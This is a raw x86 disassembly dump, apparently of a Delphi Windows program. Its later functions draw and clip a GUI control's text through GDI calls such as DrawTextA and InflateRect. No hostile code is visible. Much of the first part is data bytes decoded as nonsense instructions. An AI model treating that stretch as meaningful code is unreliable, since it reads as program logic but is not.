sub [ eax ] eax
outsb
je r-xdata
inc [ eax + 0x1004458 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
xchg [ eax + eax + 0x34 ] eax
salc
inc esp
add [ esi + edx * 8 + 0x44 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5404002e ] al
js r-xdata
sub eax [ eax ]
push es
push ebx
outsd
jb r-xdata
sbb [ eax + 0x44 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add bh bh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
inc eax
jo r-xdata
adc [ eax ] al
0xa8ff0000 0x44d7
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub [ eax ] al
push cs
push eax
popad
jb r-xdata
je r-xdata
inc esp
add [ eax ] al
mov [ fs : edi + 0x3fb80044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090032 ] al
outsb
inc ebx
insb
outsd
jae r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
das
add [ edi ] al
push esi
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
push esp
aad 0x44
add [ eax + 0x44f6 ] dh
inc ebp
add [ eax ] bh
inc eax
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
outsb
je r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
pushad
xlat
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
xor [ 0x6e4f0a00 ] 0x44
push ebp
jo r-xdata
adc [ eax ] al
cdq
add [ eax ] al
inc [ edi + edx * 8 - 0x28b3ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002a ] al
push 0x6948776f
outsb
je r-xdata
add al [ eax ]
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
cmp [ eax ] al
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
inc esp
jb r-xdata
imul esi [ ebx + 0x69 ] 0x90656c62
push ebp
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080030 ] al
outsb
inc ebx
push 0x65676e61
nop
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0033 ] al
outsb
inc ebx
outsd
outsb
je r-xdata
jne r-xdata
adc [ eax ] al
push eax
popad
jb r-xdata
mov [ ebp ] 0xff00007c
in al dx
aad 0x44
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090029 ] al
nop
jo r-xdata
outsb
jo r-xdata
add [ eax ] al
js r-xdata
jns r-xdata
je r-xdata
inc ebp
outsb
inc esp
jb r-xdata
outsd
ja r-xdata
dec ebx
jns r-xdata
nop
push ebp
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07003b ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
xor [ eax + eax ] 0xa
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe9431e0b
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
mov al [ eax + eax - 0x10 ]
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebp
outsb
inc esp
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
dec edi
jbe r-xdata
adc [ fs : eax + eax - 0x80 ] al
push eax
outsd
jo r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
jo r-xdata
jb r-xdata
mov al [ eax + eax - 0x28 ]
add [ eax ] eax
outsb
inc ebp
js r-xdata
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
push es
dec edi
cld
mov eax [ eax + eax + 0x8 ]
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090039 ] al
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
jns r-xdata
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09003a ] al
ja r-xdata
add al [ eax ]
inc [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0037 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x21
jb r-xdata
outsb
dec ebx
jns r-xdata
adc [ eax + eax - 0x78 ] al
add al [ eax ]
dec [ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0040 ] al
outsb
dec ebp
popad
jae r-xdata
add [ eax ] cl
dec edi
outsb
push ebx
insb
jae r-xdata
insd
nop
push ebp
nop
mov al [ eax + eax - 0x20 ]
add [ eax ] eax
jmp eax
inc ecx
add [ eax ] ah
add al [ eax ]
jmp [ eax ]
push ebp
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003c ] al
outsb
dec edi
adc [ eax + eax - 0x80 ] al
outsd
arpl [ ebx - 0x4 ] bp
mov eax [ eax + eax + 0x18 ]
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
nop
push ebp
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
push ebp
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
aam 0x44
je r-xdata
xchg esp eax
inc esp
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc esp
outsd
arpl [ ebx - 0x4c ] bp
mov eax [ eax + eax + 0x10 ]
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0043 ] al
je r-xdata
jb r-xdata
outsb
push ebx
je r-xdata
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
inc esp
mov al [ eax + eax - 0x18 ]
add [ eax ] eax
outsb
dec edi
insd
nop
push ebp
inc ecx
add [ eax ] ch
add al [ eax ]
[ eax ]
add [ ecx + ebx + 0x310c0045 ] dl
je r-xdata
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + 0x48004466 ] bh
inc esp
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ edi - 0x68fffbc ] al
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + ebp * 2 + 0x44 ] dh
add [ edi + ecx + 0xdd40045 ] ah
inc ebp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + 0x44 ] bl
add [ eax + 0x4004467 ] al
add [ eax ] bh
mov ebp 0xffef0014
fcos
cld
inc esp
add [ eax + 0x68 ] cl
inc esp
add [ edi ] cl
inc esp
add [ edi + 0x44 ] dl
add [ esi ] cl
push esp
inc edx
jne r-xdata
inc esp
add [ esp + edx * 8 ] bl
inc esp
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x216cc08b
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] bh
inc esp
add [ esi + 0x22 ] dl
inc esp
add [ edx + eax ] cl
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
inc eax
add [ ebx + esi + 0x310c0040 ] ch
jb r-xdata
inc edx
add al bh
inc esp
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ edx + edx ] ah
inc ecx
add [ edx + eax ] bh
add bh bh
or al 0x1
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ 0x6d657449 ] al
jae r-xdata
outsb
push ebx
je r-xdata
inc ebx
add [ ebx ] cl
dec ecx
je r-xdata
dec eax
[ eax ]
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax + 0x12 ] bl
inc edx
add [ eax - 0x73ffbb3b ] bl
adc al [ edx ]
inc esp
mov [ eax + eax - 0x24 ] 0x11
inc edx
add [ eax + 0x12 ] dh
inc edx
add ah al
adc al [ edx ]
test ah al
inc esp
add [ esi ] bl
inc esp
add al bh
les eax [ eax + eax + 0x70 ]
pushfd
inc ebp
add [ eax ] bh
sti
inc esp
add [ eax - 0x3a ] dh
inc esp
add [ eax * 8 - 0x633fffbc ] ch
inc ebp
add ah dl
pushfd
inc ebp
add [ ebp + eax * 8 + 0x44 ] ah
add ah bh
pushfd
inc ebp
add al al
lds eax [ eax + eax + 0x54 ]
inc sp
add al ah
lds eax [ eax + eax + 0xc ]
popfd
inc ebp
add [ eax - 0x5 ] al
inc esp
add ah dl
mov [ eax + eax + 0x14 ] 0xc7
inc esp
add [ eax ] al
mov [ eax + eax + 0x20 ] 0x9d
inc ebp
add [ ebx * 4 - 0x39dbffbb ] ah
inc esp
add [ ebx + eax * 8 + 0x54110044 ] dl
inc edx
jne r-xdata
inc esp
jb r-xdata
arpl [ gs : esp + edi * 4 - 0x73 ] si
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
inc esp
add [ eax + eax ] ch
add [ eax ] al
cld
nop
and [ eax + eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec edi
add [ ecx + ecx * 2 ] dh
inc ebp
xor [ eax ] eax
sub [ ecx ] dh
inc eax
add [ esp + edi * 8 + 0x44 ] ch
outsd
insb
lea eax [ eax ]
insb
and al [ eax + eax + 0x7 ]
push cs
push esp
inc edx
jne r-xdata
inc eax
add [ eax ] ch
xor [ eax ] eax
and al 0x12
add [ ecx + esi ] cl
je r-xdata
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc ebp
je r-xdata
add [ ecx + edx + 0x45 ] bl
outsb
inc ebx
outsd
outsb
je r-xdata
outsd
insb
insb
and [ eax + eax - 0x7c ] eax
fwait
inc esp
add [ ebx ] cl
add [ eax ] cl
push ebx
je r-xdata
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
inc esp
add [ ebx + ecx * 8 ] al
inc ebx
je r-xdata
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + ebp * 2 + 0x44480044 ] ch
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ edi - 0x68fffbc ] al
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add al al
imul eax [ eax + eax - 0x5c ] 0xfc00450f
imul eax [ eax + eax + 0x54 ] 0x58004513
adc eax [ ebp ]
adc [ edx ] dl
inc ebp
add [ eax + 0x30004511 ] bh
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + 0x44 ] bl
add [ eax + 0x38004467 ] al
imul eax [ eax + eax + 0x8 ] 0x6b00500
mov al 0x7
mov al 0x11
mov ebp 0x14bd35
jmp r-xdata
insb
jae r-xdata
add [ ebp + 0x22e00040 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dh
and eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x23e60044 ] dh
inc esp
add [ eax ] bl
add al [ eax ]
add [ eax ] ah
and [ eax + eax + 0x38 ] eax
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
sub_4432b9
xor eax [ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
xor eax [ eax + eax - 0x22 ]
xor eax [ eax + eax + 0x14 ]
add al [ eax ]
add [ eax ] ah
and [ eax + eax + 0x38 ] eax
adc [ edx ] eax
mov al 0x33
inc eax
add [ edx + ecx + 0x33b80042 ] cl
inc eax
add [ ecx + ebx + 0x310c0045 ] dl
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ esi + ebp * 2 + 0x44480044 ] ch
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ edi - 0x68fffbc ] al
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax + esi * 2 + 0xfa40044 ] bl
inc ebp
add ah dh
jo r-xdata
outsd
inc esp
add [ esp + edx * 2 ] cl
push edx
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
nop
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ edi + ebp * 2 ] cl
inc esp
add [ eax ] dl
jo r-xdata
add [ eax ] cl
push ebx
je r-xdata
add [ eax + eax ] al
adc [ eax - 0x42ee4ffa ] dh
0x20ff
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
dec eax
push esp
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
push [ eax ]
insb
jae r-xdata
add dh bh
pop eax
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa065646f
xchg [ eax + eax + 0x34 ] eax
salc
inc esp
add [ esi + edx * 8 + 0x44 ] ah
add [ eax ] dh
test [ eax + eax ] 0x0
add [ eax - 0x80000000 ] al
sldt [ edi ]
inc ebx
popad
jo r-xdata
aas
inc ebp
add [ eax + 0x453f ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050013 ] al
je r-xdata
imul ebp [ edi + 0x6e ] r-xdata
enter 0x0 0xfe
int3
inc eax
outsd
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
add al 0x88
inc esp
add [ ecx ] ah
add bh bh
mov cl cl
inc esp
add [ edx + ecx * 8 ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add ah bl
imul eax [ ecx ] 0x3c
add [ eax ] al
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
xor eax [ eax + edi * 4 - 0x80 ]
inc esp
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc al 0x0
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
[ eax ]
jae r-xdata
add bh bh
sub bh dl
inc esp
add [ eax ] bh
xlat
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
jb r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
pop ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
movsb [ edi ] [ esi ]
and al 0x42
add [ eax ] ch
xchg [ eax + eax - 0x65 ] eax
add [ eax ] al
[ ebx + 0x1ff0000 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x72440800
popad
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
sub_443b18
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455ae4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0xb9
mov eax esi
call sub_44cdf0
mov edx 0x69
mov eax esi
call sub_44ce14
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_443b74
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fe88
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x208 ]
call sub_424990
mov edx r-xdata
mov eax [ ebx + 0x208 ]
call sub_4248ec
add [ esi + 0x4 ] eax
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
pop esi
pop ebx
retn
push 0xffffffff
push 0xffffffff
push esi
call InflateRect
sub_443be0
push ebp
mov ebp esp
mov ecx 0x11
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_443f82
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x208 ]
mov edx [ ebx + 0x68 ]
mov eax edi
call sub_424990
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
mov edx r-xdata
mov eax edi
call sub_4248ec
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ ebp - 0x1d ]
push eax
mov edx [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
lea edx [ ebp - 0x50 ]
mov eax ebx
call sub_44d634
cmp [ ebp - 0x50 ] 0x0
je r-xdata
dec edx
mov ecx [ ebx + 0x48 ]
xor eax eax
call sub_416c50
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
adc edx 0x0
push 0x0
lea eax [ ebp - 0x2d ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_416c50
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x54 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x54 ]
call sub_4041ac
push eax
lea edx [ ebp - 0x58 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x58 ]
call sub_4043ac
push eax
mov eax edi
call sub_424a70
push eax
call GetTextExtentPoint32A
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
mov ecx [ ebp - 0xc ]
xor edx edx
xor eax eax
call sub_416c50
mov eax ebx
mov si 0xffc8
call sub_403370
test al al
jne r-xdata
mov edx 0xff000006
mov eax [ edi + 0x14 ]
call sub_424210
inc [ ebp - 0x1d ]
inc [ ebp - 0x19 ]
mov edx 0xff000014
mov eax [ edi + 0x14 ]
call sub_424210
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424638
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x1d ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ edi + 0x14 ]
call sub_424210
jmp r-xdata
mov [ ebp - 0x39 ] eax
mov eax [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x25 ]
push eax
mov eax [ ebp - 0x29 ]
push eax
mov eax [ ebp - 0x2d ]
push eax
mov eax edi
call sub_424a70
push eax
call ExcludeClipRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x48 ]
sub eax 0x8
sub eax [ ebp - 0x25 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
push 0x0
push 0x8
lea eax [ ebp - 0x2d ]
push eax
call OffsetRect
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443f89
lea eax [ ebp - 0x8c ]
mov edx 0x5
call sub_403f10
lea eax [ ebp - 0x68 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x60 ]
call sub_4045cc
lea eax [ ebp - 0x5c ]
mov edx 0x4
call sub_403f10
retn
mov eax ebx
mov si 0xffc8
call sub_403370
test al al
jne r-xdata
lea edx [ ebp - 0x1d ]
mov eax edi
call sub_424638
lea edx [ ebp - 0x68 ]
mov eax ebx
call sub_44d634
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0xd ] 0x1c
mov [ ebp - 0xd ] 0x1b
jmp r-xdata
lea edx [ ebp - 0x3d ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x21 ]
sub eax [ ebp - 0x29 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x78 ]
push eax
lea edx [ ebp - 0x7c ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x7c ]
mov eax [ ebx + 0x208 ]
call sub_4248d0
push eax
mov eax [ ebp - 0x15 ]
pop edx
sub eax edx
sub eax 0x8
xor ecx ecx
xor edx edx
call sub_416c50
push edi
lea esi [ ebp - 0x78 ]
lea edi [ ebp - 0x1d ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x1d ]
push eax
xor ecx ecx
xor edx edx
mov eax 0x8
call sub_416c50
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x64 ]
lea eax [ ebp - 0x60 ]
call sub_404718
mov eax [ ebp - 0x60 ]
push eax
lea eax [ ebp - 0x2d ]
push eax
push 0x0
push 0x0
mov eax edi
call sub_424a70
push eax
call sub_43fdc4
lea ecx [ ebp - 0x4c ]
pop edx
call sub_44000c
jmp r-xdata
call sub_43fdc4
lea ecx [ ebp - 0x4c ]
mov dl [ ebp - 0xd ]
call sub_440070
lea eax [ ebp - 0x3d ]
push eax
push 0x0
mov eax edi
call sub_424a70
push eax
call sub_43fdc4
lea ecx [ ebp - 0x4c ]
pop edx
call sub_43ff60
push 0x0
mov eax edi
call sub_424a70
push eax
call SelectClipRgn
lea edx [ ebp - 0x5c ]
mov eax ebx
call sub_44d634
cmp [ ebp - 0x5c ] 0x0
je r-xdata
mov edx 0x20
mov eax ebx
call sub_44f914
mov esi eax
mov eax esi
or eax 0x400
push eax
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x80 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x80 ]
call sub_4041ac
push eax
lea edx [ ebp - 0x84 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x84 ]
call sub_4043ac
push eax
mov eax edi
call sub_424a70
push eax
call DrawTextA
mov edx [ ebx + 0x70 ]
mov eax [ edi + 0x14 ]
call sub_424210
push esi
lea eax [ ebp - 0x1d ]
push eax
lea edx [ ebp - 0x88 ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x88 ]
call sub_4041ac
push eax
lea edx [ ebp - 0x8c ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x8c ]
call sub_4043ac
push eax
mov eax edi
call sub_424a70
push eax
call DrawTextA
sub_443f9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44400e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464d50
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4532a0
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
call sub_45437c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_444015
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_444060
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_455064
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x41
mov eax esi
call sub_44cdf0
mov edx 0x11
mov eax esi
call sub_44ce14
mov [ esi + 0x16d ] 0x1
mov [ esi + 0x170 ] 0x1
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
mov eax esi
test bl bl
je r-xdata
sub_44410c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_444262
